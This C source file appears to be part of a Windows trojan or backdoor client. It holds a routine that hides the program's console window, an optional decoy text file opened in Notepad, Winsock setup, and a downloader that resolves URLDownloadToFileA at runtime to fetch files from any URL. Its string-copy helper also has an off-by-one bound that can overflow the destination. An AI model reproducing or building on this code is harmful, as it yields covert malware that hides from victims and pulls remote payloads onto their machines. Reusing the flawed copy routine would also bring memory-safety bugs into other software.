#include "main.h"

void stealth()
{
	HWND stealth;
	AllocConsole();
	stealth=FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(stealth, 0);
}

int setup_win(struct main_struct * m_s)
{
	int err;

	err = 0;
	#ifndef _DEBUG
		stealth();
	#endif
	#if defined(TEXT_FILE_ON)
		system("echo " TEXT_CONTENT " > " FILE_NAME "&& notepad " FILE_NAME);
	#endif
	err = WSAStartup(MAKEWORD(2, 2), &m_s->wsa);
	if(err != NO_ERROR)
		return -1;
	else
		return 0;
}

int download_web(char *url, char *path)
{
	int r = 1;
	HMODULE hDll;
	UDTF URLDownloadToFile;

	if ((hDll = LoadLibrary("urlmon"))) {
		if ((URLDownloadToFile = (UDTF)GetProcAddress(hDll, "URLDownloadToFileA"))) {
			if (URLDownloadToFile(0, url, path, 0, 0) == 0)
				r = 0;
		}
		FreeLibrary(hDll);
	}
	return r;
}

int my_strcmp(char * str1, char *str2)
{
    int i;

    i = 0;
    if (strlen(str1) != strlen(str2))
        return 0;
    while ((str1[i] == str2[i]) && (i <= strlen(str1)))
        i++;
    if (i < strlen(str1))
        return 0;
    else
        return 1;
}

int my_strcpy(char *dest, char *src, int src_size)
{
	int i;

	i = 0;
	while (src[i] != '\0' && i <= src_size) {
		dest[i] = src[i];
		i++;
	}
	if (i < src_size)
		return -1;
	else
		return 0;
}
